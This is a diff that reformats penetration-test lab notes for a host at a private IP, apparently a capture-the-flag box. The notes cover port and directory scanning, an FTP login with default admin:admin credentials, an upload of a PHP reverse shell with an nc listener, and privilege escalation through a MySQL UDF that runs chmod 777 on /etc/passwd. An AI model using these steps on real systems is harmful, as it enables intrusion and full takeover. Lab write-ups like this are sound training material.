@@ -3,6 +3,7 @@
 # ip 192.168.239.56
 
 # nmap
+```
 PORT     STATE  SERVICE    VERSION
 20/tcp   closed ftp-data
 21/tcp   open   ftp        vsftpd 3.0.3
@@ -11,17 +12,19 @@ PORT     STATE  SERVICE    VERSION
 5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
 8080/tcp open   http       Apache httpd 2.4.25
 8295/tcp open  http    Apache httpd 2.4.25 ((Debian))
-
+```
 # gobuster
+```
 we found img web where pall img are stored
 /css                  (Status: 301) [Size: 321] [--> http://192.168.239.56:8295/css/]
 /lib                  (Status: 301) [Size: 321] [--> http://192.168.239.56:8295/lib/]
 /img                  (Status: 301) [Size: 321] [--> http://192.168.239.56:8295/img/]
 /js                   (Status: 301) [Size: 320] [--> http://192.168.239.56:8295/js/]
 /contactform          (Status: 301) [Size: 329] [--> http://192.168.239.56:8295/contactform/]
-
+```
 
 # ftp
+```
 default pass can be bruteforce
 admin:admin
 
@@ -30,15 +33,17 @@ ftp> cd img
 here are imges stored for website
 
 
-
+```
 # exploitaion
+```
 └─$ nc -lvnp 22(only on 22)                          
 ftp> put php-reverse-shell.php   (in img folder)
 
 http://192.168.239.56:8295/img/php-reverse-shell.php 
 
-
+```
 # priv esc
+```
 db conf found in /var/www/
 got creds for mysql
 $ cat config.php
@@ -95,7 +100,7 @@ create function do_system returns integer soname 'raptor_udf2.so';
 
 select * from mysql.func;
 select do_system('chmod 777 /etc/passwd');
-
+```
 
 
 
